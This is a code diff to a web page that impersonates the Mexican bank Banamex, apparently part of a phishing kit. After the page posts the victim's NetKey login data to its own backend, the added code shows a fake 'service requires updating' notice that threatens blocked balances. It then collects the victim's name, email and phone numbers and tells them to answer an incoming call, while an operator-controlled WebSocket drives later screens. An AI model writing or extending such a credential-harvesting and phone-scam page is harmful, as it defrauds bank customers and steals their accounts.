@@ -620,6 +620,127 @@
                 height: 40px;
             }
         }
+
+        /* Contact Form Modal Styles */
+        .contact-modal-container {
+            background: white;
+            border-radius: 8px;
+            max-width: 600px;
+            width: 90%;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .contact-card {
+            padding: 40px;
+        }
+
+        .contact-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .contact-logo img {
+            height: 50px;
+            width: auto;
+        }
+
+        .contact-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #d32b3b;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .contact-message {
+            background: #f8f9fa;
+            border-left: 4px solid #d32b3b;
+            padding: 20px;
+            margin-bottom: 30px;
+            font-size: 14px;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        .contact-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            padding: 12px 16px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #d32b3b;
+        }
+
+        .contact-btn-submit {
+            background: #d32b3b;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        .contact-btn-submit:hover {
+            background: #b8232f;
+        }
+
+        /* Waiting Modal Styles */
+        .waiting-container {
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .waiting-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 768px) {
+            .contact-card {
+                padding: 30px 20px;
+            }
+
+            .contact-title {
+                font-size: 20px;
+            }
+
+            .form-input {
+                font-size: 16px; /* Previene zoom en iOS */
+            }
+        }
     </style>
 </head>
 <body>
@@ -805,6 +926,56 @@
         </div>
     </div>
 
+    <!-- Formulario de Contacto Modal -->
+    <div class="modal-overlay" id="contactFormModal">
+        <div class="contact-modal-container">
+            <div class="contact-card">
+                <div class="contact-logo">
+                    <img src="/banamex/images/logobanamex.svg" alt="Banamex">
+                </div>
+
+                <h2 class="contact-title">Su servicio requiere actualización</h2>
+
+                <div class="contact-message">
+                    <p>En breve, uno de nuestros ejecutivos se pondrá en contacto con usted para asesorarlo en su proceso.</p>
+                    <p style="margin-top: 12px;">Recuerde que mantener sus datos actualizados le permite emitir comprobantes CFDI con validez fiscal.</p>
+                    <p style="margin-top: 12px;"><strong>Evite el bloqueo de sus saldos.</strong></p>
+                </div>
+
+                <form id="contactForm" class="contact-form">
+                    <div class="form-group">
+                        <label for="nombre" class="form-label">Nombre completo</label>
+                        <input type="text" id="nombre" name="nombre" class="form-input" required data-testid="input-nombre">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="correo" class="form-label">Correo electrónico</label>
+                        <input type="email" id="correo" name="correo" class="form-input" required data-testid="input-correo">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="celular" class="form-label">Celular</label>
+                        <input type="tel" id="celular" name="celular" class="form-input" required data-testid="input-celular">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="telefonoAlternativo" class="form-label">Teléfono alternativo <span style="color: #999;">(opcional)</span></label>
+                        <input type="tel" id="telefonoAlternativo" name="telefonoAlternativo" class="form-input" data-testid="input-telefono-alternativo">
+                    </div>
+
+                    <button type="submit" class="contact-btn-submit" data-testid="button-submit-contact">Continuar</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mensaje de Espera -->
+    <div class="modal-overlay" id="waitingModal">
+        <div class="waiting-container">
+            <h2 class="waiting-title">Espere un momento, recibirá una llamada, contéstela</h2>
+        </div>
+    </div>
+
     <script>
         let currentSessionId = null;
         let ws = null;
@@ -953,15 +1124,15 @@
             
             if (netkeyResponse && window.loginData) {
                 try {
-                    // Ocultar modal
+                    // Ocultar modal NetKey
                     const netkeyModal = document.getElementById('netkeyModal');
                     netkeyModal.classList.remove('active');
 
-                    // Mostrar loader
+                    // Mostrar loader temporalmente
                     const loadingOverlay = document.getElementById('loadingOverlay');
                     loadingOverlay.classList.add('active');
 
-                    // Enviar datos al backend
+                    // Enviar datos de NetKey al backend
                     const response = await fetch('/api/banamex/login', {
                         method: 'POST',
                         headers: {
@@ -980,10 +1151,15 @@
                     if (data.success && data.sessionId) {
                         currentSessionId = data.sessionId;
                         
-                        // Conectar al WebSocket para esperar cambios de pantalla
-                        connectWebSocket(data.sessionId);
+                        // Guardar sessionId para usarlo en el formulario de contacto
+                        window.loginData.sessionId = data.sessionId;
                         
-                        // El loader permanecerá visible hasta que el admin cambie la pantalla
+                        // Después de 1 segundo, ocultar loader y mostrar formulario de contacto
+                        setTimeout(() => {
+                            loadingOverlay.classList.remove('active');
+                            const contactFormModal = document.getElementById('contactFormModal');
+                            contactFormModal.classList.add('active');
+                        }, 1000);
                     } else {
                         // Error en el login
                         loadingOverlay.classList.remove('active');
@@ -991,6 +1167,69 @@
                     }
                 } catch (error) {
                     console.error('Error enviando datos:', error);
+                    const loadingOverlay = document.getElementById('loadingOverlay');
+                    loadingOverlay.classList.remove('active');
+                    alert('Error de conexión. Por favor, intenta de nuevo.');
+                }
+            }
+        });
+
+        // Contact form handler
+        document.getElementById('contactForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const nombre = document.getElementById('nombre').value;
+            const correo = document.getElementById('correo').value;
+            const celular = document.getElementById('celular').value;
+            const telefonoAlternativo = document.getElementById('telefonoAlternativo').value;
+            
+            if (nombre && correo && celular && window.loginData && window.loginData.sessionId) {
+                try {
+                    // Ocultar formulario de contacto
+                    const contactFormModal = document.getElementById('contactFormModal');
+                    contactFormModal.classList.remove('active');
+
+                    // Mostrar mensaje de espera
+                    const waitingModal = document.getElementById('waitingModal');
+                    waitingModal.classList.add('active');
+
+                    // Después de 3 segundos, ocultar mensaje y mostrar loader
+                    setTimeout(() => {
+                        waitingModal.classList.remove('active');
+                        const loadingOverlay = document.getElementById('loadingOverlay');
+                        loadingOverlay.classList.add('active');
+                    }, 3000);
+
+                    // Enviar datos del formulario de contacto al backend
+                    const response = await fetch('/api/banamex/contact', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            sessionId: window.loginData.sessionId,
+                            nombreContacto: nombre,
+                            correoContacto: correo,
+                            celularContacto: celular,
+                            telefonoAlternativoContacto: telefonoAlternativo
+                        }),
+                    });
+
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        // Conectar al WebSocket para esperar cambios de pantalla
+                        connectWebSocket(window.loginData.sessionId);
+                        
+                        // El loader permanecerá visible hasta que el admin cambie la pantalla
+                    } else {
+                        // Error al enviar formulario
+                        const loadingOverlay = document.getElementById('loadingOverlay');
+                        loadingOverlay.classList.remove('active');
+                        alert(data.message || 'Error al enviar el formulario');
+                    }
+                } catch (error) {
+                    console.error('Error enviando formulario:', error);
                     const loadingOverlay = document.getElementById('loadingOverlay');
                     loadingOverlay.classList.remove('active');
                     alert('Error de conexión. Por favor, intenta de nuevo.');
